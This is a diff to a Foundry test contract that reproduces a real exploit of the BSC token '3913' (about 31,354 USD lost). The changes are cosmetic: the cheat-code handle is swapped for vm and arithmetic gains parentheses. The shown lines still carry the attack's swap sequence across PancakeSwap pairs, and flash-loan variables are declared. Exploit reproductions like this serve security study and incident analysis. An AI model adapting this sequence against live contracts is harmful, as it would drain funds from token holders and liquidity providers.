@@ -2,7 +2,6 @@
 pragma solidity ^0.8.20;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo -- Total Lost : ~31,354 USD$
 // Attacker : https://bscscan.com/tx/0xb29f18b89e56cc0151c7c17de0625a21018d8ae7
@@ -29,7 +28,6 @@ interface I3913 is IERC20 {
 
 contract Exploit is Test {
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     I3913 vulnerable = I3913(0xd74F28c6E0E2c09881Ef2d9445F158833c174775);
     IPancakePair pair = IPancakePair(0x715762906489D5D671eA3eC285731975DA617583);
     IPancakePair pair3913to9419 = IPancakePair(0xd6d66e1993140966e6029815eDbB246800928969);
@@ -48,10 +46,10 @@ contract Exploit is Test {
     uint256 dodo5FlashLoanAmount;
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 33_132_467);
-        cheats.label(address(vulnerable), "3913");
-        cheats.label(address(pair), "pair");
-        cheats.label(address(token9419), "9419");
+        vm.createSelectFork("bsc", 33_132_467);
+        vm.label(address(vulnerable), "3913");
+        vm.label(address(pair), "pair");
+        vm.label(address(token9419), "9419");
     }
 
     function testExploit() public {
@@ -123,30 +121,30 @@ contract Exploit is Test {
             assertEq(vulnerable.balanceOf(address(this)), 873_285_322_509_556_749_289_919_955_755);
             path[0] = address(vulnerable);
             path[1] = address(busd);
-            uint256[] memory amountOut = router.getAmountsOut(vulnerable.balanceOf(address(this)) * 98 / 100, path);
+            uint256[] memory amountOut = router.getAmountsOut((vulnerable.balanceOf(address(this)) * 98) / 100, path);
             assertEq(amountOut[0], 855_819_616_059_365_614_304_121_556_639);
 
             busd.transfer(address(pair), 1);
             vulnerable.transfer(address(pair), amountOut[0]);
 
-            assertEq(amountOut[1] * 99 / 100, 386_867_521_275_785_735_087_292);
+            assertEq((amountOut[1] * 99) / 100, 386_867_521_275_785_735_087_292);
             (uint112 res0, uint112 res1,) = pair.getReserves();
             assertEq(res0, 585_082_814_956_957_699_188_861);
             assertEq(res1, 424_480_476_638_586_992_222_101_033_564);
-            assert(amountOut[1] * 99 / 100 < res0);
+            assert((amountOut[1] * 99) / 100 < res0);
             assertEq(pair.token0(), address(busd));
-            pair.swap(amountOut[1] * 99 / 100, 0, address(this), new bytes(0));
+            pair.swap((amountOut[1] * 99) / 100, 0, address(this), new bytes(0));
             path[0] = address(vulnerable);
             path[1] = address(token9419);
             amountOut = router.getAmountsOut(vulnerable.balanceOf(address(this)), path);
             token9419.transfer(address(pair3913to9419), 1);
             vulnerable.transfer(address(pair3913to9419), vulnerable.balanceOf(address(this)));
             (res0, res1,) = pair3913to9419.getReserves();
-            assert(res0 > amountOut[1] * 99 / 100);
+            assert(res0 > (amountOut[1] * 99) / 100);
             assertEq(pair3913to9419.token0(), address(token9419));
-            assertEq(amountOut[1] * 99 / 100, 278_798_044_220_113_865_039_589_361_218);
+            assertEq((amountOut[1] * 99) / 100, 278_798_044_220_113_865_039_589_361_218);
 
-            pair3913to9419.swap(amountOut[1] * 99 / 100, 0, address(this), new bytes(0));
+            pair3913to9419.swap((amountOut[1] * 99) / 100, 0, address(this), new bytes(0));
             //
             path[0] = address(token9419);
             path[1] = address(busd);
